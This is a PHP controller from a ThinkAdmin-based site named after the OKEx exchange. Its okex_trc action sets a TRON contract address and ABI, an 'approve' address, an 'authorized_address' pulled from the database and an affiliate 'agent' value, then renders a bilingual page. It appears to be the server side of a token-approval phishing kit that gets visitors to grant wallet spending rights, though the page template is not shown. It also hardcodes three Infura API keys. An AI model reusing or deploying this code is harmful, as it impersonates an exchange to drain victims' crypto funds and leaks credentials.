<?php

// +----------------------------------------------------------------------
// | ThinkAdmin
// +----------------------------------------------------------------------
// | 版权所有 2014~2021 广州楚才信息科技有限公司 [ https://www.cuci.cc ]
// +----------------------------------------------------------------------
// | 官方网站: https://thinkadmin.top
// +----------------------------------------------------------------------
// | 开源协议 ( https://mit-license.org )
// | 免费声明 ( https://thinkadmin.top/disclaimer )
// +----------------------------------------------------------------------
// | gitee 代码仓库：https://gitee.com/zoujingli/ThinkAdmin
// | github 代码仓库：https://github.com/zoujingli/ThinkAdmin
// +----------------------------------------------------------------------

namespace app\index\controller;

use think\admin\Controller;
use app\index\service\AddressService;

/**
 * Class Index
 * @package app\index\controller
 */
class Okex extends Controller
{
    public function index()
    {
		$this->fetch();
        //$this->redirect(sysuri('admin/login/index'));
    }
	
		public function okex_trc(){
		$agent = input('agent');
		$address = input('address');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent) ){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->agent = $agent;
		$this->address = config('contract.tronscan.contract')?config('contract.tronscan.contract'):$address;
		
		$this->abi = config('contract.tronscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.tronscan.addr');
		
		$authorized_add = AddressService::instance()->get_address_by_id(2);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('okex_trc');
		}
	}
		
}